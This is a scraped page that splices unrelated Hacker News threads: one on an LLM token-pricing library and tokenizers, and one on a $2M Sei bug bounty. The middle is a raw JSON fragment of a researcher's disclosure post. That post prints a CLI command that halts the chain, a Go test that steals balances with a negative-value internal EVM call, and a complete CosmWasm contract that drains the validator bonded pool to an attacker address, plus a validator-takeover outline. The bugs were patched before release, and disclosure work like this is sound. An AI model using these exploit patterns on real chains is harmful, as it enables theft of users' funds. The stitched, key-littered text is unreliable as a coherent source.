Does anything like this exist yet? reply michaelt 8 hours agoparentGenerally, if you've got a task big enough that you're worried about pricing, it's probably going to involve thousands of API calls. In that case you might as well make ~20 API calls to each LLM under consideration, and evaluate the results yourself. It's far easier to evaluate a model's performance on a given prompt by looking at the output than by looking at the input alone. reply codewithcheese 9 hours agoparentprevThat's openrouter, they are listed reply curious_cat_163 18 hours agoparentprevI have yet to find a use case where quality can be traded off. Would love to hear what you had in mind. reply Lerc 16 hours agorootparentIt is not so much a drop in quality as there are tasks that every model above a certain threshold will perform equally. Most can do 2+2 = 4. One test prompt I use on LLMs is asking it to produce a JavaScript function that takes an ImageData object and returns a new ImageData object with an all direction Sobel edge detection. Quite a lot of even quite small models can generate functions like this. In general, I don't even think this is a question that needs to be answered. A lot of API providers have different quality/price tiers. The fact that people are using the different tiers should be sufficient to show that at least some people are finding cases where cheaper models are good enough. reply mvdtnz 17 hours agorootparentprevEvery single use case of LLMs inherently sacrifices quality, whether the developers are willing to admit it or not. I agree with you though that there aren't many use cases where end users would knowingly accept the trade off. reply Ilasky 21 hours agoprevI dig it!

If there's another, very open to replacing reply yumaueno 6 hours agoprevWhat a nice product! I think the way to count tokens depends on the language, but is this only supported in English? reply lgessler 6 hours agoparentMost LLMs determine their token inventories by using byte-pair encoding, which algorithmically induces sub-word tokens from a body of text. So even in English you might see a word like \"proselytization\" tokenized apart into \"_pro\", \"selyt\", \"iz\", \"ation\", and non-English languages will probably (depending on their proportional representation in the training corpus) also receive token allocations in the BPE vocabulary. Here's actual output from the GPT-4o tokenizer for English and Hindi: >>> [enc.decode([x]) for x in enc.encode(\"proselytization\")] ['pros', 'ely', 't', 'ization'] >>> [enc.decode([x]) for x in enc.encode(\"पर्यावरणवाद\")] ['पर', '्य', 'ावरण', 'वाद'] reply Karrot_Kream 20 hours agoprevA whole bunch of the costs are listed as zeroes, with multiple decimal points.

On the \"2x vocab == 1/2 the tokens\" idea though: It usually doesn't pan out that way. Tokens aren't uniformly likely in normal text. They tend to follow some kind of a power law (like pdf(x) ~ x^0.4), and those 100k extra tokens, even assuming they're all available for use in purely textual inputs/outputs, will only move you from something like 11.4 bits of entropy per token to 12.1 (a 6% improvement). With that base idea in mind, how do we square that with your observations of large errors? It's a bit hard to know for certain since you didn't tell us which thing you're encoding, but: 1. Using an estimator, even if fairly precise and unbiased across all text, will have high variance for small inputs. If you actually need to estimate costs accurately for _each_ query (not just have roughly accurate costs summed across many queries or an accurate cost for a large query), this project is, as you pointed out, definitely not going to work. 2. Assuming your query distribution matches the tokenizer's training data in some sense, you would expect those errors to balance out over many queries (comparing total predicted costs to total actual costs) or over a single large query. That's still useful for a lot of people (e.g., to estimate the cost of running models across a large internal corpus). 3. Out-of-distribution queries are another interesting use-case where this project falls flat. IIRC somebody here on HN comments frequently about using LLMs for Hebrew text (specifically noting good performance with no tokenization, which is another fun avenue of research), and if any of the models included Hebrew-specific tokenization (I think code-specific tokenization is probably more likely in the big models, not that the specific example matters), you'll likely find that the model in question is much cheaper than the rest for those kinds of queries. There's no free lunch, and you'll necessarily also find pockets of other query types where that model's tokenizer is more expensive than the other tokenizers. This project doesn't have the ability to divine that sort of discrepancy. 4. Even being within 2x on costs (especially when we're talking about 3-4 orders of magnitude of discrepancy in the costs for the different models) is useful. It lets you accomplish things like figuring out roughly the best model you can afford for a kind of task. Separately: > This is unnecessarily harsh, I'm not \"upset with the implementation\", ... I think the problem people were noting was your tone. Saying you're uncomfortable with the methodology, that you won't use it, highlighting the error bars, pointing out pathological inputs, ..., are all potentially \"interesting\" to someone. Telling a person they should feel ashamed and are clueless is maybe appropriate somewhere sometimes, but it's strongly frowned upon at HN, usually shouldn't be done publicly in any setting, and is also a bit extreme for a project which is useful even in its current state. Cluelessness is an especially hard claim to justify when the project actually addresses your concern (just via a warning instead of a hard failure or something, which isn't your preferred behavior). reply refulgentis 2 hours agorootparentI love the deep dive! On the other hand, this situation is bad and the idea we should ignore it is misguided. Below, we show that given only 1 tokenizer is used, any outputs collapse to a function that is constant, the per token cost. This is why it's shameful: I get that people can't believe its just C100K, but it is, and the writers know that, and they know at that point there is no function, just a constant. > (especially when we're talking about 3-4 orders of magnitude of discrepancy in the costs for the different models) Between a large and small model from the same provider, but not inter-provider. The OOM mention hides the ball, yet shows something very important: no one uses a library to get a rough cost estimate when there's a 3 OOMs difference. You would use it if you were comparing models which were closer in cost...except you can't...because tokens is a constant, because they only use 1 tokenizer. > It lets you accomplish things like figuring out roughly the best model you can afford for a kind of task. The library calls Tiktoken to get the C100K count of tokens. Cost = cost per token * tokens. If it is only using C100K, tokens is constant, and the only relevant thing is cost per token, another constant. Now we're outside the realm of even needing a function. > you're uncomfortable with the methodology, that you won't use it, highlighting the error bars, pointing out pathological inputs, ..., are all potentially \"interesting\" to someone. Tangential critiques are preferable? Is the issue pathological inputs? Or is the issue that its stated, documented, and explicit purpose is cost calculation based on token calculation for 400 LLMs, and it only supports 1 tokenizer and isn't even trying to make accurate cost estimates? It's passing your string to Tiktoken for a C100K count, it's not doing the bare minimum of every other tokenizer library I've seen that builds on Tiktoken. Note there are no error bars that will satisfy because A) it's input dependent and B) it's impossible to get definitive error bars because the tokenizers they claim to support don't have any public documentation, anywhere. It's shameful to ship code that claims to calculate financial costs, is off by a minimum of 30%+, and doesn't document any of that, anywhere. This is commonly described as fraud. Shameful is a weak claim. reply hansvm 50 minutes agorootparent> Tangential critiques are preferable? Not at all. Reasoned arguments and adding information (the examples I gave were what I thought your main points were) to the discussion are preferable to (what seemed to be) character attacks. Your comment here, as an example, was mostly great. It provides the same level of usefulness to anyone reading it (highlighting that the computation is just C100K and that people will be misled if they try to use it the wrong way), and you also added reasoned counter-arguments to my OOM idea and several other interesting pieces of information. To the extent that you kept the character attacks against the author, you at least softened the language. Respectfully attacking ideas instead of people is especially important in online discourse like this. Even if you're right, attacking people tends to spiral a conversation out of control and convince no one (often persuading them of the opposite of whatever you were trying to say). > just C100K It's not just C100K though. It is for a few models [0], but even then the author does warn the caller (mind you, I prefer mechanisms like an `allow_approximate_token_count=False` parameter or whatever, but that's not fraud on the author's part; that's a dangerous API design). Going back to the \"tone\" thing, calling out those sorts of deficiencies is a great way to warn other people, let them decide if that sort of thing matters for their use case, point out potential flaws in your own reasoning (e.g., it's not totally clear to me if you think the code always uses C100K or always uses it for a subset of models, but if it's the former then you'd probably be interested in knowing that the tokenizer is actually correct for most models) and discuss better API designs. It makes everyone better off for having read your comment and invites more discussions which will hopefully also make everyone better off. > outside the realm of even needing a function Maybe! I'd argue that it's useful to have all those prices (especially since not all tokens are created equally) in one place somewhere, but arguing that this is left-pad for LLM pricing is also a reasonable thing to talk about. > it's impossible to get definitive error bars That's also true, but that doesn't matter for every application. E.g., suppose you want to run some process on your entire corporate knowledge-base and want a ballpark estimate of costs. The tokenizer error is on average much smaller than the 30%+ you saw for some specific (currently unknown to us here at HN) very small input. Just run your data through this tool, tally up the costs, and you ought to be within 10%. Nobody cares if it's a $900 project or a $1300 project (since nobody is allocating expensive, notoriously unpredictable developers to a project with only 10-30% margins). You just tell the stakeholders it'll cost $2k and a dev-week, and if it takes less then everyone is happily surprised. If they say no at that estimate, they probably wouldn't have been ecstatic with the result if it actually cost $900 and a dev-day anyway.

They only support GPT3.5 and GPT4.0. Note here: [1], and that gpt-4o would get swallowed into gpt-4-0613. 2. This will lead to massive, significant, embarrassingly large error in calculations. Tokenizers are not mostly the same, within 10% error. 1. responsive to ex. \"It's not just C100K though. It is for a few models [0]\", The link is to Tiktoken, OpenAI's tokenization library. There are literally more than GPT3.5 and GPT4.0 there, but they're just OpenAI's models, no one else's, none of the others in the long list in their documentation, and certainly not 400. Most damning? Every single one is a deprecated model that isn't served anymore. The only live ones are c100k and o200k. As described above, and shown in [1], their own code kneecaps the o200k and will use c100k 2. Let me know what you'd want to see if you're curious the 30%+ error thing. I don't want to go to the trouble to guess at a test suite, then run one, that would make you confident you need to revise a prior that there's only +/- 10% difference between arbitrary tokenizers. I will almost assuredly choose one that isn't comprehensive enough for revising a prior that much in contention in this thread, without input from you on what you consider acceptable. For context, I run about 20 unit tests, for each of the big 5 providers, with the same prompts, to capture their input and output token counts to make sure I'm billing accurately. Just to save you time, you won't be able to talk me down to \"eh, good enough!\" --- It *matters*, if it didn't, they'd be much more up front about the truth. Every single sign around the library is absolutely damning, and triangulates somewhere between lying and naivete. From the marketing claiming 400+, to the complete lack of note of these extreme* caveats in any documentation, the only thing being what I understand is a warning log.

But yes, I do agree with you. I had time implementing non-tiktoken tokenizers for my project. I ended up manually adding tokenizer.json files into my repo.[1] The other options is downloading from HF, but the official repos where the model's tokenizer.json lives require agreeing to their terms to access. So it requires an HF key, and agreeing to the terms. So not a good experience for a consumer of the package. > Message frame tokens? Do you mean the chat template tokens? Oh, that's another good point. Yeah, it counts OpenAI prompt tokens, but you're right it doesn't count chat template tokens. So that's another source of inaccuracy. I solved this by implementing a Jinja templating engine to create the full prompt. [2] Granted, both llama.cpp and mistral-rs do this on the backend, so it's purely for counting tokens.

    "originBody": "← Sei Jun 17, 2024 In April 2024, I found and reported two critical bugs to Sei Network concerning their layer-1 blockchain. One of these issues impacted the chain’s availability, and the other its integrity. The Sei Foundation awarded me $75,000 and $2,000,000 respectively for these reports. Both issues were caught after the code had been audited, merged, and slated for release but before it was shipped to production. As a result, no funds were put at risk. If it had made it to mainnet, the funds at risk from issue 2 would have been the entire Sei token market cap, or about $1B USD mark to market. Issue 1 If exploited, the first issue would have caused the chain to halt. The Sei Network is a “Cosmos chain”, meaning it leverages the Cosmos SDK for its blockchain application and uses a tendermint fork (well, actually, Sei’s own fork of a fork) for consensus. Cosmos applications operate on blocks, which contain transactions, which further contain individual messages. Each of these messages triggers a state transition. The Cosmos SDK is written in Go. Cosmos uses go panics for error handling. Transaction runs out of gas? panic. Try to spend more coins than you have? panic. Invalid inputs? panic. To handle this, transactions are run within a recovery loop called the RunTx recovery middleware. When Cosmos processes a block of transactions, the flow is kind of like this (heavily simplified). func ProcessBlock(chainState State, curBlock Block) { state.StartBlock(curBlock) state.ProcessTxs(curBlock) state.EndBlock(curBlock) } func (s State) StartBlock(curBlock Block) { for module := s.GetModules() { module.StartBlock(curBlock) } } func (s State) ProcessTxs(curBlock Block) error { defer func() { if r := recover() { return fmt.Errorf(\"borked\") } } // process tx, panics are ok in this function } func (s State) EndBlock(curBlock Block) { for module := s.GetModules() { module.EndBlock(curBlock) } } There’s some preprocessing to set up a block, transactions are safely processed within a recovery loop, and then there is some work to do at the end of a block. Every Cosmos module can specify its own start and end processing hooks too. These hooks are one type of ABCI method. Unfortunately, by default, ABCI methods are not run in a recovery loop. Woops! If you panic there, the program will simply crash. I first learned of this Cosmos footgun from Trail of Bits’ fantastic building-secure-contracts repo. ref: https://github.com/crytic/building-secure-contracts/tree/master/not-so-smart-contracts/cosmos/abci_panic Sei had a panic in one of its ABCI EndBlockers, which would have reliably halted the chain if the code was reached. Remediation would have required a hard fork. While looking through all of the ABCI hooks in the Sei codebase for reachable panics, one stood out to me: https://github.com/sei-protocol/sei-chain/blob/49eb8b3d205d4a73c5e2b2bb3a433f886279028b/x/evm/module.go#L232 coinbaseAddress := state.GetCoinbaseAddress(idx) balance := am.keeper.BankKeeper().GetBalance(ctx, coinbaseAddress, denom) weiBalance := am.keeper.BankKeeper().GetWeiBalance(ctx, coinbaseAddress) if !balance.Amount.IsZero() || !weiBalance.IsZero() { if err := am.keeper.BankKeeper().SendCoinsAndWei(ctx, coinbaseAddress, coinbase, balance.Amount, weiBalance); err != nil { panic(err) } } The above code, at the end of every block, goes through each transaction and tries to empty the “coinbase address” of any tokens. The way this is done is first the coinbase address’s balance is retrieved via a call to GetBalance and then this resulting balance is transferred out by a call to SendCoinsAndWei. What the coinbase address represents in Sei doesn’t matter here. What’s important is that it is a deterministic address, calculable in advance. The address is calculated as a function of a tx’s index in a block. So the first tx in a block always has a “coinbase address” of sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv, and so on. The mistake here stems from the fact that cosmos chains have a notion of locked and unlocked balances. The GetBalance function called above returns the total of locked+unlocked funds. If, for example, the coinbase address has 42sei of locked funds and 1000sei of unlocked funds, the GetBalance call will report a total balance of 1042sei. However, because we can only transfer unlocked funds, the SendCoinsAndWei call will return an error if we call it with any number greater than 1000ei. When SendCoinsAndWei is called with an amount of 1042 sei, it will return an error and then we will reach the call to panic. One way to end up with locked funds is via a vesting account. If, for example, I want to grant you one thousand tokens linearly over four years then I can create a vesting account and the unlocks are handled automatically by Cosmos. When creating a vesting account I can specify its address and any unused address will do. I don’t need the keys to it or anything. Now we have all the pieces needed to reach an ABCI panic: Create a vesting account at the sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv address with some tokens. Send an EVM tx to Sei to reach this code block. To create the vesting account all we have to do is run a command like seid tx vesting create-vesting-account sei1v4mx6hmrda5kucnpwdjsqqqqqqqqqqqqlve8dv 1000000000000000usei 1800000000 --from my_account --fees 50000usei from the seid CLI tool. Once this command is executed and the vulnerable code is run, the coinbase balance will be greater than zero but not entirely transferable. The call to GetBalance will return the sum of locked and unlocked tokens. Calling SendCoinsAndWei with this sum will return an error, and a panic will be triggered. The application will crash and the chain will halt. To fix the issue, the call to GetBalance was simply replaced with a call to SpendableCoins. Easy! For safety, later on the panic was removed entirely. Fix: https://github.com/sei-protocol/sei-chain/pull/1586/files#diff-115be1725cca6393185395215fba9c7f1150801c7111c60fd6a65720db7a8808 Timeline: April 22, 2024: I create the report on Immunefi April 23, 2024: The Sei team merge a PR fixing the bug April 23, 2024: The Sei team confirm the report April 24, 2024: The Sei team send payment of $75,000 Issue 2 If exploited, the second issue would have allowed an attacker to freely transfer funds out of any account. When browsing through the fix commit and subsequent changes made as a result of the previous issue, I noticed some interesting code at the junction of Sei’s Cosmos and Geth modules. At this time the Sei team was just wrapping up their work on Sei V2. V2 introduced the EVM (Ethereum Virtual Machine) to Sei. Integrating the EVM into a system like Cosmos is a sensitive process. Neither of these systems were designed with the other’s compatibility in mind and trying to combine them is difficult. It’s easy to introduce subtle yet disastrous bugs to your blockchain when doing this. In the fix PR for the previous issue, an unrelated bug was also patched in the evm account balance handling code. Looking at this file, I noticed that SubBalance and AddBalance had provisions for negative numbers: func (s *DBImpl) SubBalance(evmAddr common.Address, amt *big.Int, reason tracing.BalanceChangeReason) {s.k.PrepareReplayedAddr(s.ctx, evmAddr)if amt.Sign() == 0 { return}if amt.Sign() = 0 } Looks like an account can make transfers as long as it has more than the amount being transferred. Looks good so far. Say I want to steal 100sei; I’d need to send a transfer of -100sei. Well, even a 0sei balance is more than -100sei. So for negative amounts this check will always pass. Of course, there may be even more checks prior to this. Or not. It’s a big codebase, I don’t know. Let’s just write the code and see what happens. In SeiV2 there are three high level ways to trigger this EVM transfer code: From EVM space, use a CALL, CREATE or SELFDESTRUCT opcode Send a top level EVM Message packaged in a transaction From cosmwasm space, send an internal EVM message If any of these routes allow transfers of negative value then we will be able to steal the entire unlocked balance from any account. Right off the bat the first option will not work. The EVM uses 256 bit registers that we can set freely as opcode arguments but the state transition handling code for CALL and CREATE treat these as unsigned integers, so they are always positive. SELFDESTRUCT triggers transfers but doesn’t take a value argument. The second option seems promising. We only need to construct a MsgEVMTransaction with negative value. However, Sei’s MsgEVMTransaction type uses the RLP encoding from Geth for the data field, which itself includes the value field. value is typed as a big int, which is a signed type and can be negative! Unfortunately there is no valid RLP encoding for a negative big int: when encoding, the sign information is discarded. When decoding, the output is always positive. // WriteBigInt encodes a big.Int as an RLP string. // Note: Unlike with Encode, the sign of i is ignored. func (w EncoderBuffer) WriteBigInt(i *big.Int) {w.buf.writeBigInt(i) } The third option uses yet another execution mode contained in Sei. Really Sei V2 has three modes of executing transactions: Cosmos messages cosmwasm EVM Technically cosmwasm and EVM programs are both triggered by high level cosmos messages, but it’s worth considering them separately. Cosmos transactions contain messages that execute specific functions. For example a message might execute an action like “stake some coins” or “send some coins”. These functions are baked into the chain code and are not generally programmable by end users. The community found this a bit limiting, so to add more flexibility cosmwasm was introduced to bring a web assembly environment to Cosmos. This enabled general-purpose smart contract programming by end users. Finally, Sei V2 builds on both of these and adds a bespoke EVM environment to the mix. The way this is done is by linking to go-ethereum and adding hooks to connect the EVM state mutations to the underlying Cosmos system and storage. So now in addition to the fixed functions that can be called by messages, we also have the ability to specify messages that “create a cosmwasm or EVM program” or “execute a cosmwasm or EVM program”. The cosmwasm (web assembly) module is well tested and widely used. Sei’s EVM integration is custom, only used by Sei, and brand new. At the time of my report, a Cosmos message in Sei could bounce execution back and forth between these environments as much as it wants. One could, for example, send a transaction that contains a message to call a cosmwasm program, which then dispatches a cosmos message to send coins, receives its result and calls an EVM contract. Calling an EVM smart contract from cosmwasm in SeiV2 is slightly different from making a top-level EVM call directly. To make a cosmwasm -> EVM call we use one of the following “internal” message types instead of MsgEVMTransaction. type MsgInternalEVMCall struct {Sender stringValue *github_com_cosmos_cosmos_sdk_types.IntTo stringData []byte } type MsgInternalEVMDelegateCall struct {Sender stringCodeHash []byteTo stringData []byteFromContract string } Remember, what we’re interested in is triggering a transfer with a negative amount or value (these terms are used interchangeably at times). Of these two internal call types, only MsgInternalEVMCall allows us to specify a value to go along with the call. And it’s a signed int! To find out whether or not I could successfully use MsgInternalEVMCall to make a siphoning transfer I added the following test to Sei’s test suite and ran it. func TestNegativeTransfer(t *testing.T) {steal_amount := int64(1_000_000_000_000)k := testkeeper.EVMTestApp.EvmKeeperctx := testkeeper.EVMTestApp.NewContext(false, tmtypes.Header{}).WithBlockHeight(2)attackerAddr, attackerEvmAddr := testkeeper.MockAddressPair()victimAddr, victimEvmAddr := testkeeper.MockAddressPair()// associate addrsk.SetAddressMapping(ctx, attackerAddr, attackerEvmAddr)k.SetAddressMapping(ctx, victimAddr, victimEvmAddr)// mint some funds to victimamt := sdk.NewCoins(sdk.NewCoin(k.GetBaseDenom(ctx), sdk.NewInt(steal_amount)))require.Nil(t, k.BankKeeper().MintCoins(ctx, types.ModuleName, sdk.NewCoins(sdk.NewCoin(k.GetBaseDenom(ctx), sdk.NewInt(steal_amount)))))require.Nil(t, k.BankKeeper().SendCoinsFromModuleToAccount(ctx, types.ModuleName, victimAddr, amt))// construct attack payloadval := sdk.NewInt(steal_amount).Mul(sdk.NewInt(steal_amount * -1))req := &types.MsgInternalEVMCall{ Sender: attackerAddr.String(), Data: []byte{}, Value: &val, To: victimEvmAddr.Hex(),}// loggingpreAttackerBal := testkeeper.EVMTestApp.BankKeeper.GetBalance(ctx, attackerAddr, k.GetBaseDenom(ctx)).Amount.Int64()preVictimBal := testkeeper.EVMTestApp.BankKeeper.GetBalance(ctx, victimAddr, k.GetBaseDenom(ctx)).Amount.Int64()t.Logf(\"PRE ATTACKAttacker Bal: %dVictim Bal: %d------\\b\", preAttackerBal, preVictimBal)// EXECUTE ATTACK_, err := k.HandleInternalEVMCall(ctx, req)require.Nil(t, err)// post loggingpostAttackerBal := testkeeper.EVMTestApp.BankKeeper.GetBalance(ctx, attackerAddr, k.GetBaseDenom(ctx)).Amount.Int64()postVictimBal := testkeeper.EVMTestApp.BankKeeper.GetBalance(ctx, victimAddr, k.GetBaseDenom(ctx)).Amount.Int64()t.Logf(\"POST ATTACKAttacker Bal: %dVictim Bal: %d------\\b\", postAttackerBal, postVictimBal) } The output was: $ go test -v -timeout 30s -run \"^TestNegativeTransfer$\" github.com/sei-protocol/sei-chain/x/evm/keeper === RUN TestNegativeTransfer evm_test.go:67: PRE ATTACK Attacker Bal: 0 Victim Bal: 1000000000000 ------ evm_test.go:76: POST ATTACK Attacker Bal: 1000000000000 Victim Bal: 0 ------ --- PASS: TestNegativeTransfer (0.00s) PASS ok github.com/sei-protocol/sei-chain/x/evm/keeper 0.215s Sure enough, we can send an internal EVM call from an attacker account to a victim account with a negative value and siphon out that value from the victim’s balance. At this point all funds on the chain are at risk. An attacker could freely steal Sei tokens from centralized exchanges, cold wallets, etc. Given that Sei is trading at around a $1 billion market cap with >$100M of daily volume between derivatives and spot, there is a lot of profit opportunity here. But for fun, we can take this bug even further. Cosmos chains operate on proof of stake consensus. For Sei, this means that the 50 validators with the most stake are responsible for producing and verifying new blocks on the chain. All 50 validators’ stakes are held in one account called the “bonded token pool”. An attacker can become the #1 most powerful validator on the chain by simply stealing the balance of the bonded token pool, and staking that sum again themselves. When they do this the tokens are returned to the same account they stole them from. If you create 50 accounts, and do this 50 times, you will own all of the top 50 validators and control the chain. Because the active validator set is recalculated at the end of every block in an ABCI method, this whole attack can be done in one block. Under the tendermint consensus system, anyone with >2/3rds stake can arbitrarily choose what blocks are canonical on the chain. At this point the chain is considered compromised and needs to be hard forked from before the attack. Some things the attacker can do include: Censor anyone’s transactions. If someone tried to use this same exploit to steal coins back from the attacker, their transactions can be ignored and will never land in a block. Commit invalid state transitions. The attacker can use their 2/3rds stake to attest to whatever blocks they want, including ones with arbitrary information and proofs in the block header. Double spend coins. While the token theft mechanism is perfectly valid according to the chain’s code, certain types of faults like committing invalid blocks will be rejected by honest full nodes. These nodes will simply stop advancing their local chain in the face of a safety fault. But other attacks, like transaction censoring, are not detectable. Light clients that only check validator proofs, like those used in IBC, will accept any of the attacker blocks. Timeline: April 23, 2024: I create the report on Immunefi April 24, 2024: The Sei team merge a PR fixing the bug April 24, 2024: The Sei team confirm the report May 22, 2024: The Sei team send payment of $2,000,000 I’d like to thank the Sei Foundation for their commendable efforts in securing the Sei protocol. It is only due to their thoroughness in designing Sei’s security strategy that these bugs were able to be caught before the vulnerable code was deployed to mainnet. The issues described here are subtle and persisted through Sei’s internal code review and several external audits. However Sei has gone above and beyond, putting a large amount of resources towards setting up a public bug bounty program in their pursuit of defense in depth. In rapidly addressing and honestly rewarding these reports, the Sei Foundation has demonstrated their absolute commitment to protecting their users. Appendix Particularly attentive readers might notice that the test I added to confirm issue 2 is not actually an end to end proof of concept. In the test I constructed a MsgInternalEVMCall directly. But in a real attack scenario we would have to create a cosmwasm contract compiled to webassembly, populate this struct from there, serialize it to JSON, and send it as a submessage from cosmwasm back to the main cosmos application which would construct the MsgInternalEVMCall for us. These two scenarios are not identical. The JSON->Msg encoder and handler functions are both custom written by the Sei team and were skipped in my test. It is reasonable to wonder whether or not there they contain additional guards that might prevent the attack but were skipped in the test I made. When submitting my report to Sei I was very confident that there were no such guards, as I had read all of the code many times at that point and knew it inside and out. But eventually I wanted to test stealing tokens from the bonded validator pool to take over the validator set. I ended up making a proper end to end proof of concept because I wasn’t sure whether or not the bonded token pool had any special status as an account, potentially with some sort of lock on its tokens, and wanted to test this. The following cosmwasm contract exploits the bug and drains the bonded token pool. #[cfg(not(feature = \"library\"))] use cosmwasm_std::entry_point; use cosmwasm_std::{ BalanceResponse, BankQuery, CosmosMsg, DepsMut, Env, Int256, MessageInfo, Reply, Response, StdError, StdResult, SubMsg, CustomMsg }; use cw_storage_plus::Item; use crate::msg::InstantiateMsg; use cosmwasm_schema::cw_serde; use serde::{Deserialize, Serialize}; use schemars::JsonSchema; #[cfg_attr(not(feature = \"library\"), entry_point)] pub fn instantiate( _deps: DepsMut, _env: Env, _info: MessageInfo, _msg: InstantiateMsg, ) -> Result { Ok(Response::default()) } #[cfg_attr(not(feature = \"library\"), entry_point)] pub fn execute( deps: DepsMut, _env: Env, _info: MessageInfo, msg: ExecuteMsg, ) -> Result, StdError> { match msg { ExecuteMsg::Attack{} => { let uswei_to_swei_multiplier: Int256 = 1000000000000i64.into(); let bal_q = BankQuery::Balance { // sdk.AccAddress(tmcrypto.AddressHash([]byte(\"bonded_tokens_pool\")) -> sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk address: \"sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk\".into(), denom: \"usei\".into() }; let res: BalanceResponse = deps.querier.query(&bal_q.into())?; let bonded_account_balance = res.amount.amount; // common.BytesToAddress(sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk) -> 0x4feA76427B8345861e80A3540a8a9D936FD39391 let bonded_token_addr = \"0x4feA76427B8345861e80A3540a8a9D936FD39391\"; let steal_amt_abs = Int256::from(bonded_account_balance) * uswei_to_swei_multiplier; let steal_amt = steal_amt_abs * Int256::from(-1); let steal_msg = EvmMsg::CallEvm { to: bonded_token_addr.into(), data: \"\".into(), value: steal_amt }; let steal_item: Item = Item::new(\"steal_amount\"); steal_item.save(deps.storage, &steal_amt_abs)?; let steal_msg:CosmosMsg = CosmosMsg::Custom(steal_msg); let steal_msg = SubMsg::reply_always(steal_msg, 1337); let resp = Response::new(); let resp = resp.add_submessage(steal_msg); Ok(resp) } } } #[cfg_attr(not(feature = \"library\"), entry_point)] pub fn reply(deps: DepsMut, _env: Env, _msg: Reply) -> StdResult> { let steal_item: Item = Item::new(\"steal_amount\"); let transfer_amount = steal_item.load(deps.storage)?; let attacker_evm_addr = \"0xC399a700B09aEeb7d6b9E6374eEA5dd0639Cb52C\"; let fwd_msg = EvmMsg::CallEvm { to: attacker_evm_addr.into(), data: \"\".into(), value: transfer_amount, }; let fwd_msg:CosmosMsg = CosmosMsg::Custom(fwd_msg); Ok(Response::new().add_message(fwd_msg)) } #[cw_serde] pub enum ExecuteMsg { Attack {} } // implement custom query impl CustomMsg for EvmMsg {} // this is a helper to be able to return these as CosmosMsg easier impl From for CosmosMsg { fn from(original: EvmMsg) -> Self { CosmosMsg::Custom(original) } } #[derive(Serialize, Deserialize, Clone, Debug, PartialEq, JsonSchema)] #[serde(rename_all = \"snake_case\")] pub enum EvmMsg { CallEvm { to: String, data: String, // base64 encoded value: Int256, }, }",

    "commentBody": "Sei pays out $2M bug bounty (usmannkhan.com)218 points by sygma 23 hours agohidepastfavorite108 comments danielvf 22 hours agoThe bounties in crypto are so big because the math is so clear on the cost vs benefits of the bounties. Paying two million to avoid losing a billion is not a bad deal. And there just aren't enough security people yet that market forces have commoditized bounty finding. Good companies use bounties as yet another security layer - after doing everything else, add a bug bounty! Almost all crypto bug bounties run through Immunefi. [1] There are lots of > one million dollar bounties. You can see SEI's current bounty page here.[2] The company I work (a different company) for has a one million dollar bounty listed on immunefi.com and median response time of six hours. [1] https://immunefi.com/bug-bounty/ [2] https://immunefi.com/bug-bounty/sei/ reply strictnein 22 hours agoparentEverything in Crypto (for both meanings of the word) has a built in bug bounty. It's just whether or not the companies want to take part in it. reply latchkey 15 hours agorootparentEverything in finance... banks have the same bug bounty. reply bufferoverflow 13 hours agorootparentNot really. Bank transactions are reversible (especially when banks themselves are affected). And if you try to wire money to your account, you will be found trivially. reply latchkey 8 hours agorootparentDefinitely not true. My last company had the finance department phished and they never recovered the funds. It was about $50k I believe. See also all the people pissed at zelle. reply acdha 6 hours agorootparentNothing is true in absolute terms but banks care about loss percentages and that’s much better in the real banking sector. For example, the national bank of Bangladesh was compromised in 2016, believed to be a well-resourced attack by North Korea, and the attacker was able to attempt to transfer $1B. That’s about as severe as it gets, but the U.S. Federal Reserve blocked 85% of the transferred funds and of the remaining funds, all of the money sent to Sri Lanka was recovered, and they were able to recover some of the funds laundered through a corrupt bank in the Philippines whose manager was subsequently charged. About $64M was laundered through casinos which were not at the time required to follow KYC. https://www.bbc.com/news/stories-57520169 So, not great, but the losses are under 10% of the amount the hackers had access to and there’s still a chance of recovering the rest - that’s survivable with insurance and it’s basically the traditional finance world at its worst in terms of corruption & poor preparation. Compare it to cryptocurrency, where losses on that scale happen multiple times a year rather than once a decade, and the attackers have a much easier time laundering funds through the infrastructure setup for exactly that purpose. North Korea is getting over a billion dollars a year from cryptocurrency, which is much better than the tens of millions at greater risk they got here. reply which 1 hour agorootparentThe money was only stopped at the Federal Reserve because the address used in some of the wire transactions included the word Jupiter which was a sanctioned entity at the time and the matching was sufficiently fuzzy that this was caught. That was a complete accident. It just as easily could have gone the other way. I just read a case on the layoffs subreddit where a law firm was hacked and one of their clients was tricked into wiring millions of dollars to the wrong account, resulting in the client suing the law firm for negligence and the law firm having to fire a bunch of people. One Latvian guy tricked Google and other large tech companies into wiring him a hundred million dollars total which was only recovered because he was arrested and plead guilty. Business email compromise is a huge plague on society and in many cases the recovered amount is trivial. The only way you are recovering the bulk of losses if you don't notice the theft very quickly is if the amount is high enough that a prosecutor is interested and it hasn't all been withdrawn as cash yet. reply latchkey 6 hours agorootparentprevThis discussion has really gone off the rails. All I was saying was that banks have a bug bounty on their head, the next person responded that bank transactions are reversible, which isn't entirely true in all cases. I wasn't trying to compare sizes or anything like that. reply fragmede 12 hours agorootparentprevSometimes they are. There's a network of seedy international banks that scammers use to take their victims money, because otherwise the scam wouldn't work. reply ffpip 9 hours agorootparentDo you have examples? People can avoid them reply fragmede 8 hours agorootparentThe scammers wire the money out of your account into a bank account they control, and then put it in another bank, and then move it further on from there. Knowing which bank they have their account at doesn't help you avoid the problem. reply ffpip 7 hours agorootparentYeah I understood the mechanism, just wanted to know the companies that enable such things. reply BeetleB 19 hours agorootparentprevOne just happens to be more legal than the other. reply asterix_pano 19 hours agorootparentDepends, it's not clear yet that \"code is law\" or is not. reply TacticalCoder 19 hours agorootparent> Depends, it's not clear yet that \"code is law\" or is not. Aren't there quite a few cases already where attackers stealing funds from smart contracts were considered just that: thieves. And where their \"code is law\" defense didn't amuse the judge? IIRC we recently even saw two sent to jail for manipulating smart contract prices: it's not even clear they used a bug in a smart contract. I already posted it but Uncle Sam cannot have it both ways: if Uncle Sam asks people making money with cryptocurrencies to pay taxes, Uncle Sam goes after those who steal from the taxpayers. And... Oh boy, does Uncle Sam tax gains. reply nubb 17 hours agorootparentiirc someone successfully argued code is law in a court in france reply MattGaiser 19 hours agorootparentprevIs there any hint of the legal system accepting that? They certainly don’t accept “locks are law” or “finders keepers.” reply yieldcrv 18 hours agorootparentyes, 